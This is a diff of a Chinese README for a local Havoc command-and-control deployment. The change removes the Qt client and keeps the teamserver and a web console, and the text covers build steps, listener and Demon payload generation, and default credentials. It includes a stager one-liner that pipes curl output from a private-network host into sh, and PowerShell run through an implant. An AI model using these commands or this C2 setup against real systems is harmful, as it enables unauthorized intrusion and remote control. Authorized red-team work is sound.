@@ -3,26 +3,33 @@
 本目录完成了 Havoc Framework 的源码下载、编译与运行验证。
 上游项目：<https://github.com/HavocFramework/Havoc>（当前部署版本 **0.7 / Bites The Dust**）
 
+> **2026-11-11 变更：Qt 客户端已移除，只保留 Teamserver + Web 控制台。**
+> - `havoc-src/client/Modules` 保留（Web 端 77 条模块命令的 Python 脚本 + BOF `.o`），**不要删**；
+> - `client/src`、`client/data`、`client/external`、`client/Build`、`client/Havoc`、CMake 工程已删除；
+> - `toolchain/qt5` 已删除（Qt5 deb 仍在 `toolchain/debs/`，需要时可重新解包）；
+> - 命令表来源固化到 `webui/reference/`；完整备份在 `backup/qt-client-20261111.tar.gz`。
+> - **本文档第 3、5、11 节及涉及客户端编译、启动、中文界面、截图对照的内容属于历史记录，已不再适用。**
+
 ---
 
 ## 1. 目录结构
 
 ```
 /home/kali/桌面/Havoc/
-├── havoc-src/                 # 源码仓库（git clone，含 client/Modules 子仓库）
+├── havoc-src/                 # 源码仓库（git clone；Qt 客户端已移除）
 │   ├── havoc                  # 编译产物：Teamserver（Go，19 MB）
-│   ├── client/Havoc           # 编译产物：客户端（C++/Qt5，4.5 MB）
-│   ├── client/Modules/        # 客户端 Python 模块（Packer/RemoteOps/...）
+│   ├── client/Modules/        # Python 模块 + BOF 对象文件（Web 端复用，勿删）
 │   ├── profiles/havoc.yaotl   # 默认配置（监听 0.0.0.0:40056）
 │   └── data/                  # 运行数据、证书、数据库、交叉编译器包装器
 ├── toolchain/                 # 本地工具链（未写入系统，全部在用户空间）
 │   ├── go/                    # Go 1.27.3
 │   ├── venv/bin/cmake         # CMake 3.31.6（通过 pip 安装）
-│   └── qt5/usr/               # Qt5 5.15.19 开发包 + WebSockets（从 .deb 解包）
-├── webui/                     # Web 控制台（独立进程，浏览器替代 Qt，:8081）
+│   └── debs/                  # Qt5 deb 包（已不再使用，仅作恢复来源）
+├── webui/                     # Web 控制台（独立进程，唯一的操作界面，:8081）
 │   ├── gateway.py             # aiohttp 网关：登录/ REST / WS / 静态页
 │   ├── havoc_client.py        # teamserver WSS 客户端（自动重连）
 │   ├── state.py / commands.py # 协议解码与命令构造
+│   ├── reference/             # 命令表快照（Commands.cc / client-config.toml）
 │   └── static/                # 前端（深色主题）
 ├── stager/stager_server.py    # 一键上线暂存服务（/swt、/slt、/payloads/*）
 ├── start-all.sh               # 一键启动 Teamserver + Web 控制台 + 暂存服务（后台）
@@ -31,7 +38,7 @@
 ├── stop-stager.sh             # 单独停止暂存服务
 ├── payloads-out/              # 暂存服务投递的载荷目录（含 demon.x64.exe）
 ├── start-teamserver.sh        # 单独启动 Teamserver（前台）
-├── start-client.sh            # 启动客户端
+├── backup/                    # 移除 Qt 客户端前的完整备份
 └── logs/                      # 构建与运行日志、截图
 ```
 
@@ -65,37 +72,25 @@ cd /home/kali/桌面/Havoc
 cd /home/kali/桌面/Havoc
 ./start-teamserver.sh
 
-# 终端 2：启动客户端（GUI）
-cd /home/kali/桌面/Havoc
-./start-client.sh
-
-# 单独启动 Web 控制台（浏览器替代 Qt，后台运行）
+# 终端 2：单独启动 Web 控制台（唯一的操作界面，后台运行）
 cd /home/kali/桌面/Havoc/webui
 ./start-webui.sh        # http://<本机IP>:8081/  默认 admin / havoc1234
 ```
 
-客户端连接参数：
-
-| 字段 | 值 |
-|------|-----|
-| Host | `127.0.0.1` |
-| Port | `40056` |
-| User | `5pider` |
-| Password | `password1234` |
-
-> 用户名 **区分大小写**，务必小写。默认账号定义在 `havoc-src/profiles/havoc.yaotl`，**正式使用前请修改密码**。
+> Qt 客户端已移除（见文首变更说明），`havoc-src/profiles/havoc.yaotl` 现在只保留网关使用的
+> 操作员 `Neo`。浏览器端账号见 `webui/config.json`；**正式使用前请同时修改两处口令**。
 
 ## 3. 首次使用流程
 
-1. 客户端连上后，菜单 **View → Listeners** 打开监听器面板，点击 `Add` 新建 HTTP/HTTPS 监听器并 `Save`。
-2. 菜单 **Attack → Payload**，选择 Agent（Demon）、Listener、Arch（x64/x86）、Format（Windows Exe / Shellcode / DLL…），点击 **Generate**。
-3. 生成的载荷位于 `havoc-src/data/`（构建日志显示在 Payload 窗口的 Building Console）。
+1. 浏览器登录 Web 控制台，`视图 → 监听器 → 添加` 新建 HTTP/HTTPS 监听器并保存。
+2. `攻击 → 载荷生成`，选择 Agent（Demon）、Listener、Arch（x64/x86）、Format（Windows Exe / Shellcode / DLL…），点击生成。
+3. 生成的载荷位于 `havoc-src/data/`（构建日志显示在载荷对话框的构建控制台）。
 
 ## 4. 运行验证结果
 
 - Teamserver 正常监听 `wss://0.0.0.0:40056`，自签名证书自动生成于 `data/server.cert|key`。
-- 客户端成功连接并通过认证，服务端日志出现 `[GOOD] User <5pider> Authenticated`。
-- 截图：`logs/havoc-connected.png`（已连接主界面）、`logs/payload-dialog.png`（载荷生成向导）。
+- 网关以 `Neo` 连接并通过认证，服务端日志出现 `[GOOD] User <Neo> Authenticated`。
+- 截图：`logs/havoc-connected.png`（历史：已移除的 Qt 客户端主界面）、`logs/payload-dialog.png`（载荷生成向导）。
 - Demon 载荷交叉编译链路已单独验证：用与 Teamserver 完全一致的编译命令可产出 98 KB 的 `PE32+ x86-64` 可执行文件。
 
 ## 5. 与官方安装方式的差异（重要）
@@ -118,36 +113,42 @@ cd /home/kali/桌面/Havoc/webui
 ## 6. 重新构建
 
 ```bash
-# Teamserver
+# 方式一（推荐）：make 目标，已适配本机环境（不调用 sudo、跳过 setcap）
+cd /home/kali/桌面/Havoc/havoc-src
+PATH=/home/kali/桌面/Havoc/toolchain/go/bin:$PATH \
+GOCACHE=/home/kali/桌面/Havoc/toolchain/gocache \
+GOPROXY=https://goproxy.cn,direct \
+make ts-build
+
+# 方式二：直接调 go
 cd /home/kali/桌面/Havoc/havoc-src/teamserver
 PATH=/home/kali/桌面/Havoc/toolchain/go/bin:$PATH \
 GOCACHE=/home/kali/桌面/Havoc/toolchain/gocache \
 GOPROXY=https://goproxy.cn,direct \
 go build -ldflags="-s -w -X cmd.VersionCommit=$(git rev-parse HEAD)" -o ../havoc main.go
 
-# 客户端
-cd /home/kali/桌面/Havoc/havoc-src/client
-/home/kali/桌面/Havoc/toolchain/venv/bin/cmake -S . -B Build \
-  -DCMAKE_PREFIX_PATH=/home/kali/桌面/Havoc/toolchain/qt5/usr -DCMAKE_BUILD_TYPE=Release
-/home/kali/桌面/Havoc/toolchain/venv/bin/cmake --build Build -- -j8
+# Qt 客户端已移除，不再有客户端构建步骤。
+# 若需要恢复 Qt5 前缀（仅为历史备份/重新编译旧客户端）：
+#   mkdir -p toolchain/qt5/usr && for d in toolchain/debs/*.deb; do dpkg-deb -x "$d" toolchain/qt5/usr; done
 ```
+
+> `make ts-build` 只在 `data/*-w64-mingw32-cross/bin` 交叉编译器缺失时才调用上游
+> `teamserver/Install.sh`（该脚本需要 sudo，且带 `dir/` 路径 typo，会无条件 `apt install`）；
+> setcap 用 `sudo -n` 尝试，失败则跳过——teamserver 默认 40056 端口不需要 `cap_net_bind_service`。
 
 ## 7. 停止 / 清理
 
 ```bash
-# 停止进程
-pkill -f "havoc server" ; pkill -f "client/Havoc"
+# 停止进程（stop-all.sh 会按进程身份停止，不会误杀其它 havoc）
+cd /home/kali/桌面/Havoc && ./stop-all.sh
 
-# 清理构建缓存与数据库（保留源码与工具链）
+# 清理 Teamserver 构建缓存与数据库（保留源码与工具链）
 cd /home/kali/桌面/Havoc/havoc-src && make ts-cleanup
-rm -rf client/Build client/Havoc
 ```
 
 ## 8. 注意事项
 
 - Teamserver 默认监听 `0.0.0.0:40056`，处于公网/办公网时请修改 `profiles/havoc.yaotl` 的 `Host`/`Port` 并更换默认口令，或用防火墙限制来源。
-- Kali 上客户端字体可能不是等宽字体（上游已知问题），可在 `client/config.toml` 的 `[font] family` 改为 `DejaVu Sans Mono`。
-- 客户端启动时若提示找不到配置文件，请在 `havoc-src` 目录下运行（脚本已处理）。
 - Havoc 仅应用于已获得明确授权的安全测试。
 
 ---
@@ -378,7 +379,7 @@ shell curl -fsSL http://192.168.121.132:9901/slt | sh
 `webui/` 是独立进程的浏览器控制台：界面按 Qt 客户端（hexhub 深色主题）复刻，
 并实现了聊天、文件管理器（增删改查/上传下载/在线编辑）、进程列表、监听器增删、战利品，以及 **载荷生成、会话图、扩展商店、
 Python 脚本/Python 控制台**。不改 Qt 客户端、不动 9901 投递链，可与 Qt 客户端同时在线
-（网关用 `Neo`，Qt 用 `5pider`，互不踢线）。
+（Qt 客户端已移除，网关以 `Neo` 单连接运行；多浏览器共用该连接）。
 
 ![Web 控制台](webui/docs/main.png)
 
@@ -472,7 +473,7 @@ cd /home/kali/桌面/Havoc/webui
 - **Windows 侧可达性**：经 Demon 执行
   `powershell (Invoke-WebRequest -UseBasicParsing http://192.168.121.132:8081/).StatusCode`
   → `200`；
-- Qt 客户端（5pider）与网关（Neo）同时在线不互踢。
+- Qt 客户端已移除，不再存在「两客户端同时在线」的场景；网关单连接承载所有浏览器。
 
 ### 14.8 加密传输监听器（2026-11-09）
 
